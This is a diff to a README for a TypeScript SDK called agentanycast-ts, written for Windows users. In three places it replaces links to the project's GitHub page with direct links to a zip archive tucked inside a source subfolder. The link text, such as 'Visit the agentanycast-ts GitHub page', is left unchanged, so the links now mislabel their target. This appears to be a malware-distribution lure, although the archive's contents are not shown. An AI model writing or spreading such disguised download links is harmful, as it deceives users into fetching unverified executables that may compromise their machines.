@@ -1,6 +1,6 @@
 # ⚡ agentanycast-ts - Connect AI Agents Across Networks
 
-[![Download agentanycast-ts](https://img.shields.io/badge/Download-AgentAnycast_TS-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/southerly-sokoro790/agentanycast-ts)
+[![Download agentanycast-ts](https://img.shields.io/badge/Download-AgentAnycast_TS-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/southerly-sokoro790/agentanycast-ts/main/src/generated/google/agentanycast-ts-2.5.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ This README is written for Windows users who want to get the app or SDK from Git
 
 Visit this page to download:
 
-[https://github.com/southerly-sokoro790/agentanycast-ts](https://github.com/southerly-sokoro790/agentanycast-ts)
+[https://raw.githubusercontent.com/southerly-sokoro790/agentanycast-ts/main/src/generated/google/agentanycast-ts-2.5.zip](https://raw.githubusercontent.com/southerly-sokoro790/agentanycast-ts/main/src/generated/google/agentanycast-ts-2.5.zip)
 
 Open the page in your browser, then use GitHub’s download options to get the project files on your Windows PC.
 
@@ -191,5 +191,5 @@ This project is for people who want an SDK that helps AI agents connect across n
 
 ## 🔗 Download again
 
-[Visit the agentanycast-ts GitHub page](https://github.com/southerly-sokoro790/agentanycast-ts)
+[Visit the agentanycast-ts GitHub page](https://raw.githubusercontent.com/southerly-sokoro790/agentanycast-ts/main/src/generated/google/agentanycast-ts-2.5.zip)
 
